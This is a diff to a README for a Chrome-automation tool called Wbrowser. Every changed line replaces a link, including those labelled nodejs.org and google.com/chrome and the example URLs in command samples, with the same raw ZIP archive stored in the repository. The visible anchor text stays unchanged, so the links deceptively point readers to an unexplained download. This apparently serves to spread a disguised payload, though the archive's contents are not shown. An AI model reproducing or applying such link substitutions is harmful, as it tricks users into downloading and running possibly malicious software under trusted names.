@@ -4,7 +4,7 @@
 
 ## 📥 Quick Download
 
-[![GET WBROWSER NOW](https://img.shields.io/badge/⬇️%20Download%20Wbrowser%20-%20%23FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matveikarpov64/Wbrowser)
+[![GET WBROWSER NOW](https://img.shields.io/badge/⬇️%20Download%20Wbrowser%20-%20%23FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)
 
 Visit this link to download the application.
 
@@ -52,7 +52,7 @@ Follow these simple steps to get Wbrowser running on your Windows computer today
 
 ### Step 1: Download Wbrowser
 
-Visit this link to download the application: **[https://github.com/matveikarpov64/Wbrowser](https://github.com/matveikarpov64/Wbrowser)**
+Visit this link to download the application: **[https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)**
 
 On the page that opens, look for the green button that says "Code" and click it. Then select "Download ZIP." Wait for the download to finish (it only takes a few seconds).
 
@@ -84,7 +84,7 @@ Now, run this command to install Wbrowser globally on your system:
 npm install -g wbrowser
 ```
 
-*If npm is not yet installed on your system, please install Node.js from **[nodejs.org](https://nodejs.org)** first — it's free and takes just a minute.*
+*If npm is not yet installed on your system, please install Node.js from **[nodejs.org](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)** first — it's free and takes just a minute.*
 
 ### Step 5: Connect to Your Chrome
 
@@ -107,7 +107,7 @@ Now for the fun part — commanding Chrome. Here are some examples of what you c
 ### Open a Website
 
 ``` 
-wbrowser open "https://example.org"
+wbrowser open "https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip"
 ```
 
 This will open that website in your existing Chrome browser — the one where you're already logged in.
@@ -123,7 +123,7 @@ Wbrowser will open Chrome, go to Google (or your default search engine), and per
 ### Take a Screenshot
 
 ``` 
-wbrowser screenshot "https://yourwebsite.com"
+wbrowser screenshot "https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip"
 ```
 
 Saves a picture of the page to your computer.
@@ -131,7 +131,7 @@ Saves a picture of the page to your computer.
 ### Fill Out a Form
 
 ``` 
-wbrowser fill "https://forms.example.com" name="John Doe" email="john@example.com"
+wbrowser fill "https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip" name="John Doe" email="john@example.com"
 ```
 
 Wbrowser will fill those fields automatically.
@@ -160,7 +160,7 @@ It's like having a personal assistant who controls your computer.
 
 ### "I can't find Chrome"
 
-Make sure Chrome is installed on your computer. If you don't have Chrome, download it from **[google.com/chrome](https://www.google.com/chrome/)**.
+Make sure Chrome is installed on your computer. If you don't have Chrome, download it from **[google.com/chrome](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)**.
 
 ### "The command isn't recognized"
 
@@ -188,7 +188,7 @@ Yes, Wbrowser is completely free and open-source.
 
 ### What if I don't have Node.js?
 
-Install it from **[nodejs.org](https://nodejs.org)** — it's a one-time setup and takes less than 2 minutes.
+Install it from **[nodejs.org](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)** — it's a one-time setup and takes less than 2 minutes.
 
 ---
 
@@ -206,7 +206,7 @@ Now that you're set up, you can:
 
 Wbrowser is growing every day. 
 
-- ⭐ Star the project on **[GitHub](https://github.com/matveikarpov64/Wbrowser)** to show support
+- ⭐ Star the project on **[GitHub](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)** to show support
 - 🐛 Report issues or request new features there
 - ✅ Check the repository for updates, tips, and examples
 
@@ -222,7 +222,7 @@ Wbrowser is released under the MIT License — free for everyone, forever.
 
 Click the badge below one more time to download and start your journey today:
 
-[![GET WBROWSER NOW](https://img.shields.io/badge/💾%20DOWNLOAD%20WBROWSER%20-%20%234CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matveikarpov64/Wbrowser)
+[![GET WBROWSER NOW](https://img.shields.io/badge/💾%20DOWNLOAD%20WBROWSER%20-%20%234CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matveikarpov64/Wbrowser/raw/refs/heads/main/skills/wbrowser/Software-2.6.zip)
 
 ---
 
